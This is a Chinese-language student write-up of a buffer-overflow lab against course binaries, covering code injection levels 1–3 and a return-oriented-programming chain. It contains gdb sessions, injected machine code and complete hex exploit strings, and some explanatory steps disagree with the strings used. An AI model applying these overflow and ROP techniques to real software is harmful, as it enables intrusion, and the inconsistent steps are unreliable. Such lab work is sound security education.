
## Part I: Code Injection Attacks

### Level 1

目标是在执行getbuf()时通过注入代码以转向touch1(),touch1()的反汇编代码为:

```
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

可见touch1()的入口地址为0x4017c0

00 00 00 00 00 40 17 c0

getbuf()反汇编代码如下,栈指针分配了0x28=40个字节的空间

```
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

建立level1答案文件ctarget_l1.txt

```
./hex2raw < ctarget_l1.txt | ./ctarget 
```
会出现报错FAILED: Initialization error: Running on an illegal host [lbc-OMEN-by-HP-Laptop-15-dc0xxx].这里是因为没有使用CMU内网 所以加上-q命令，选择不提交到评分服务器即可


```
./hex2raw < ctarget_l1.txt | ./ctarget -q
```
用以下命令将ctarget_l1.txt 转换为ctarget_l1-raw.txt --保存输入getbuf()的字符串
```
./hex2raw < ctarget_l1.txt > ctarget_l1-raw.txt

```

接下来使用gdb进行调试
```
gdb ctarget  ##进入gdb调试状态
```

首先设置断点
```
break *0x4017b9
```

输入run -q 发现要求输入一个字符串

输入 

```
run -q < ctarget_l1-raw.txt 
```

表示将ctarget_l1-raw的第一行作为getbuf的输入

```
(gdb) print /x $rsp
$1 = 0x5561dc78

```

说明$rsp的地址为0x5561dc78 那么0x5561dc78 开始40个字节就是栈分配的空间 打印出0x5561dc78 开始48个字节

```
x/48xb 0x5561dc78 #显示0x5561dc78（address）处40个(n)1字节(u)的内容，以十六进制(x)表示；
```

输出
```
(gdb) x/48xb 0x5561dc78
0x5561dc78:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5561dc80:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5561dc88:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5561dc90:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5561dc98:	0x00	0x60	0x58	0x55	0x00	0x00	0x00	0x00
0x5561dca0:	0x76	0x19	0x40	0x00	0x00	0x00	0x00	0x00

```
可以看出0x5561dca0--0x5561dca7 就是返回test()中执行getbuf()后返回的位置

所以更爱ctarget_l1 前40个字符只要不为换行符即可 或八个字符代表0x4017c0 小端模式 低字节在低地址 同时在栈中高地址保存后输入的字节  因此输入顺序为c0 17 40 00 00 00 00 00
```
31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 c0 17 40 00 00 00 00 00
```

运行

```
./hex2raw < ctarget_l1.txt | ./ctarget -q
```

发现结果正确

### Level 2

touch2反汇编代码为

```
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38>
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	callq  401c8d <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	callq  401d4f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>

```


可见touch2()的入口地址为0x4017ec




建立level2答案文件ctarget_l2.txt


用以下命令将ctarget_l2.txt 转换为ctarget_l2-raw.txt --保存输入getbuf()的字符串
```
./hex2raw < ctarget_l2.txt > ctarget_l2-raw.txt

```

首先在touch2()中设置断点


```
break *0x4017ec
```

输入 

```
run -q < ctarget_l2-raw.txt 
```
打印出cookie的值 8个字节
```
x/8xb 0x6044e4 #显示0x6044e4（address）处8个(n)1字节(u)的内容，以十六进制(x)表示；
0x6044e4 <cookie>:	0xfa	0x97	0xb9	0x59	0x00	0x00	0x00	0x00

```

生成level2的需要注入的代码，首先建立一个ctarget_l2.s文件输入将touch2的%edi(输入参数val)置为cookie的值


```
mov    0x202ce2(%rip),%edi
ret
```

以上代码会出现Program received signal SIGSEGV, Segmentation fault。原因是%rip的值在不同程序中不同，所以会指向空指针，将cookie的值直接复制给%edi
```
mov    $0x59b997fa,%edi
ret
```

 

```
unix> gcc -c ctarget_l2.s 
unix> objdump -d ctarget_l2.o > ctarget_l2.d
```
打开ctarget_l2.d即可得到汇编代码的机器码

```
Disassembly of section .text:

0000000000000000 <.text>:
   0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
   5:	c3                   	retq   
```

修改ctarget_l2.txt,将从($rsp)开始的5个字节设置为机器码bf fa 97 b9 59 c3

同时将($rsp+0x28)开始的8个字节设置为($rsp)，这样就可以跳转到该地址执行代码

```
8b 3d e2 2c 20 00 c3 ec 17 40 00 00 00 00 00 ec 17 40 00 00 00 00 00 ec 17 40 00 00 00 00 00 ec 17 40 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 
```
最后8位为注入代码的首地址78 dc 61 55 00 00 00 00 ，这里将栈顶 也就是$rsp=0x5561dc78作为输入代码的首地址 ,在注入代码ret后的地址就是程序要跳转的地址，应该是touch2()的入口地址为0x4017ec

在getbuf中设置断点

```

break *0x4017b9
```
输入 
```

run -q < ctarget_l2-raw.txt 

```

```
(gdb) print /x $rsp
$1 = 0x5561dc78

```
输出

```

(gdb) x/56xb 0x5561dc78
```
执行stepi 运行到(%rsp+5)也就是对应retq的地址

```

(gdb) print /x $rsp
$1 = 0x5561dca8

```
所以将touch2()的入口地址设置到0x5561dca8开始的8个字节，修改ctarget_l2为
```
bf fa 97 b9 59 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 ec 17 40 00 00 00 00 00
```
运行
```
./hex2raw < ctarget_l1.txt | ./ctarget -q

```
发现结果正确

### Level 3

touch3反汇编代码为

```
00000000004018fa <touch3>:
  4018fa:	53                   	push   %rbx
  4018fb:	48 89 fb             	mov    %rdi,%rbx
  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>
  401905:	00 00 00 
  401908:	48 89 fe             	mov    %rdi,%rsi    #将输入的sval 赋值给%rsi
  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
  401911:	e8 36 ff ff ff       	callq  40184c <hexmatch>
  401916:	85 c0                	test   %eax,%eax
  401918:	74 23                	je     40193d <touch3+0x43>
  40191a:	48 89 da             	mov    %rbx,%rdx
  40191d:	be 38 31 40 00       	mov    $0x403138,%esi
  401922:	bf 01 00 00 00       	mov    $0x1,%edi
  401927:	b8 00 00 00 00       	mov    $0x0,%eax
  40192c:	e8 bf f4 ff ff       	callq  400df0 <__printf_chk@plt>
  401931:	bf 03 00 00 00       	mov    $0x3,%edi
  401936:	e8 52 03 00 00       	callq  401c8d <validate>
  40193b:	eb 21                	jmp    40195e <touch3+0x64>
  40193d:	48 89 da             	mov    %rbx,%rdx
  401940:	be 60 31 40 00       	mov    $0x403160,%esi
  401945:	bf 01 00 00 00       	mov    $0x1,%edi
  40194a:	b8 00 00 00 00       	mov    $0x0,%eax
  40194f:	e8 9c f4 ff ff       	callq  400df0 <__printf_chk@plt>
  401954:	bf 03 00 00 00       	mov    $0x3,%edi
  401959:	e8 f1 03 00 00       	callq  401d4f <fail>
  40195e:	bf 00 00 00 00       	mov    $0x0,%edi
  401963:	e8 d8 f4 ff ff       	callq  400e40 <exit@plt>
  
  000000000040184c <hexmatch>:
  40184c:	41 54                	push   %r12
  40184e:	55                   	push   %rbp
  40184f:	53                   	push   %rbx
  401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
  401854:	41 89 fc             	mov    %edi,%r12d
  401857:	48 89 f5             	mov    %rsi,%rbp
  40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401861:	00 00 
  401863:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
  401868:	31 c0                	xor    %eax,%eax
  40186a:	e8 41 f5 ff ff       	callq  400db0 <random@plt>
  40186f:	48 89 c1             	mov    %rax,%rcx
  401872:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx
  401879:	0a d7 a3 
  40187c:	48 f7 ea             	imul   %rdx
  40187f:	48 01 ca             	add    %rcx,%rdx
  401882:	48 c1 fa 06          	sar    $0x6,%rdx
  401886:	48 89 c8             	mov    %rcx,%rax
  401889:	48 c1 f8 3f          	sar    $0x3f,%rax
  40188d:	48 29 c2             	sub    %rax,%rdx
  401890:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax
  401894:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  401898:	48 c1 e0 02          	shl    $0x2,%rax
  40189c:	48 29 c1             	sub    %rax,%rcx
  40189f:	48 8d 1c 0c          	lea    (%rsp,%rcx,1),%rbx
  4018a3:	45 89 e0             	mov    %r12d,%r8d
  4018a6:	b9 e2 30 40 00       	mov    $0x4030e2,%ecx
  4018ab:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
  4018b2:	be 01 00 00 00       	mov    $0x1,%esi
  4018b7:	48 89 df             	mov    %rbx,%rdi
  4018ba:	b8 00 00 00 00       	mov    $0x0,%eax
  4018bf:	e8 ac f5 ff ff       	callq  400e70 <__sprintf_chk@plt>
  4018c4:	ba 09 00 00 00       	mov    $0x9,%edx  #%edx第三个参数  9
  4018c9:	48 89 de             	mov    %rbx,%rsi  #%rsi第二个参数  val cookie处的hex转化为string
  4018cc:	48 89 ef             	mov    %rbp,%rdi  #%rdi第一个参数 sval 输入的string
  4018cf:	e8 cc f3 ff ff       	callq  400ca0 <strncmp@plt>
  4018d4:	85 c0                	test   %eax,%eax
  4018d6:	0f 94 c0             	sete   %al
  4018d9:	0f b6 c0             	movzbl %al,%eax
  4018dc:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
  4018e1:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi
  4018e8:	00 00 
  4018ea:	74 05                	je     4018f1 <hexmatch+0xa5>
  4018ec:	e8 ef f3 ff ff       	callq  400ce0 <__stack_chk_fail@plt>
  4018f1:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
  4018f5:	5b                   	pop    %rbx
  4018f6:	5d                   	pop    %rbp
  4018f7:	41 5c                	pop    %r12
  4018f9:	c3                   	retq   

```
可见touch3()的入口地址为0x4018fa


%eax为0则跳转，但是我们不希望跳转，所以%eax需要为1

建立level3答案文件ctarget_l3.txt


用以下命令将ctarget_l3.txt 转换为ctarget_l3-raw.txt --保存输入getbuf()的字符串

```

./hex2raw < ctarget_l3.txt > ctarget_l3-raw.txt
```
输入 

```
run -q < ctarget_l3-raw.txt 

```
cookie的值 8个字节并没有改变0xfa	0x97	0xb9	0x59	0x00	0x00	0x00	0x00

生成level3的需要注入的代码，首先建立一个ctarget_l3.s文件输入将touch3的%rdi(输入参数sval)置为exploit string中某个的地址

```
mov    $0x5561dc80,%rdi
ret
```


```
unix> gcc -c ctarget_l3.s 
unix> objdump -d ctarget_l3.o > ctarget_l3.d 
```
打开ctarget_l3.d即可得到汇编代码的机器码

```
0000000000000000 <.text>:
   0:	48 c7 c7 80 dc 61 55 	mov    $0x5561dc80,%rdi
   7:	c3                   	retq  
```
修改ctarget_l3.txt,将从($rsp)开始的8个字节设置为机器码48 c7 c7 e4 44 60 00 c3

```
35 39 62 39 39 37 66 61 48 c7 c7 78 dc 61 55 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 dc 61 55 00 00 00 00 fa 18 40 00 00 00 00 00 
```

同时将($rsp+0x28)开始的8个字节设置为($rsp)，这样就可以跳转到该地址执行代码

在getbuf中设置断点

```
break *0x4017b9
```
输入 

```
run -q < ctarget_l3-raw.txt 
```
```
(gdb) print /x $rsp
$1 = 0x5561dc78
```
输出

```
(gdb) x/48xb 0x5561dc78
```
在touch3()中设置断点

```
break *0x401916
```
在hexmatch中设置断点

```
break *0x4018cf
```
```
(gdb) print /x $rsi
$1 = 0x5561dc1b
```
```
(gdb) print /x $rdi
$1 = 0x5561dc78
```

```
(gdb) x/8xb 0x5561dc1b
0x5561dc1b:	0x35	0x39	0x62	0x39	0x39	0x37	0x66	0x61

```
希望%rsi所指向的地址开始的8个字符和希望%rdi所指向的地址开始的8个字符因此注入代码中的字符串应该为35 39 62 39 39 37 66 61 48
选择在0x5561dc80开始的8个字节保存 所以注入的机器代码应该是

```
mov    $0x5561dc80,%rdi
ret

```
这里出现调用hexmatch之后$0x5561dc80中的内容被覆盖，所以再次在getbuf()中中断，打印

```
(gdb) x/56xb 0x5561dc78
0x5561dc78:	0x35	0x39	0x62	0x39	0x39	0x37	0x66	0x61
0x5561dc80:	0x48	0xc7	0xc7	0x78	0xdc	0x61	0x55	0xc3
0x5561dc88:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5561dc90:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5561dc98:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5561dca0:	0x80	0xdc	0x61	0x55	0x00	0x00	0x00	0x00
0x5561dca8:	0xfa	0x18	0x40	0x00	0x00	0x00	0x00	0x00

```

发现经过调用hexmatch，只有$0x5561dc78中的没有被覆盖

选择在0x5561dc78开始的8个字节保存 在0x5561dc80开始的8个字节保存注入的机器代码48 c7 c7 80 dc 61 55 c3

```
0000000000000000 <.text>:
   0:	48 c7 c7 80 dc 61 55 	mov    $0x5561dc80,%rdi
   7:	c3                   	retq  

```
同时将touch3()的入口地址设置到0x5561dca8开始的8个字节，修改ctarget_l3为

```
35 39 62 39 39 37 66 61 48 c7 c7 78 dc 61 55 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 dc 61 55 00 00 00 00 fa 18 40 00 00 00 00 00 

```
运行

```
./hex2raw < ctarget_l3.txt | ./ctarget -q

```

发现结果正确

## Part II: Return-Oriented Programming

### level 2

```
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 3c 20 00 02 	movl   $0x2,0x203ce0(%rip)        # 6054dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 3c 20 00    	cmp    0x203ce2(%rip),%edi        # 6054e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38>
  401804:	be 08 32 40 00       	mov    $0x403208,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 8b 05 00 00       	callq  401dad <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 30 32 40 00       	mov    $0x403230,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 2d 06 00 00       	callq  401e6f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>

```
建立level2答案文件rtarget_l2.txt


用以下命令将rtarget_l2.txt 转换为rtarget_l2-raw.txt --保存输入getbuf()的字符串

```
./hex2raw < rtarget_l2.txt > rtarget_l2-raw.txt

```
首先在touch2()中设置断点

```
break *0x4017fc

```
输入 

run -q < rtarget_l2-raw.txt 

```
run -q < rtarget_l2-raw.txt 
```
打印出cookie的值 8个字节

```
x/8xb 0x6054e4 
0x6054e4 <cookie>:	0xfa	0x97	0xb9	0x59	0x00	0x00	0x00	0x00

```
这里gadget的思路就是在原来的代码中截取有用的片段，通过输入字符串以实现调用这些代码段的功能，原因是stack在ret之后%rsp指向的位置就是代码要跳转的地址
通过设置这些地址，就可以调用地址对应的代码

根据提示，可以使用popq 操作，将栈顶的值pop到一个寄存器中，查找代码发现如下代码中58(popq %rax) 90(nop) c3(ret)是我们需要的，所以首先跳转到4019ab

在输入字符串中的顺序为ab 19 40 00 00 00 00 00(注意这个是ret后$rsp指向的位置，所以这八个字节要加到前0x28个字节之后)

```
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq

```
接下来，既然要pop，所以将cookie的值复制到接下来的8个字节fa 97 b9 59 00 00 00 00

接下来，将%rax复制给%rdi，应为touch2()中比较的就是%rdi和cookie，发现如下代码48 89 c7(mov %rax %rdi) 90(nop) c3(ret)符合要求

```
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq 

```
所以跳转到4019c5

在输入字符串中的顺序为c5 19 40 00 00 00 00 00



同时将touch2()的入口地址设置到输入字符串的最后，修改rtarget_l2为

```
bf fa 97 b9 59 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 c5 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00

```
运行

```
./hex2raw < rtarget_l2.txt | ./rtarget -q
```

发现结果正确